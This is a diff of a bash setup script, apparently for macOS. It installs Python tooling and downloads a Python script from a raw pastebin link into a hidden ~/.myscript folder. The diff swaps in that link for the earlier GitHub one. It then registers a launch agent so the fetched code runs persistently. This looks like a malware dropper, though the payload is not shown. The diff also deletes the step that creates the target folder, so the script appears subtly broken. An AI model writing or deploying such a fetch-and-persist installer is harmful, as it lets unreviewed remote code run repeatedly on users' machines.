@@ -1,11 +1,5 @@
 #!/bin/bash
 
-# Function to create the .myscript directory if it doesn't exist
-function create_myscript_directory() {
-    echo "Creating directory..."
-    mkdir -p "$HOME/.myscript"
-}
-
 # Function to install Homebrew
 function install_homebrew() {
     echo "Installing Homebrew..."
@@ -14,7 +8,7 @@ function install_homebrew() {
 
 # Function to install Python with Tkinter support using Homebrew
 function install_python_tkinter() {
-    echo "Installing Python..."
+    echo "Installing Python with Tkinter support..."
     brew install python-tk
 }
 
@@ -27,7 +21,7 @@ function install_pysimplegui() {
 # Function to download the Python script
 function download_script() {
     echo "Downloading the script..."
-    curl -o "$HOME/.myscript/new.py" https://raw.githubusercontent.com/alwayshyper/protec/main/main.py
+    curl -o "$HOME/.myscript/new.py" https://pastebin.com/raw/QqQ1gac3
 }
 
 # Function to create the shell script
@@ -76,13 +70,19 @@ function load_launch_agent() {
 }
 
 # Main execution
-create_myscript_directory
-install_homebrew
-install_python_tkinter
-install_pysimplegui
-download_script
-create_shell_script
-install_launch_agent
-load_launch_agent
+function main() {
+    install_homebrew
+    # Make sure Homebrew is available in the current session
+    export PATH="/usr/local/bin:$PATH"
 
-echo "Setup completed successfully!"
+    install_python_tkinter
+    install_pysimplegui
+    download_script
+    create_shell_script
+    install_launch_agent
+    load_launch_agent
+    echo "Setup completed successfully!"
+}
+
+# Execute main function
+main
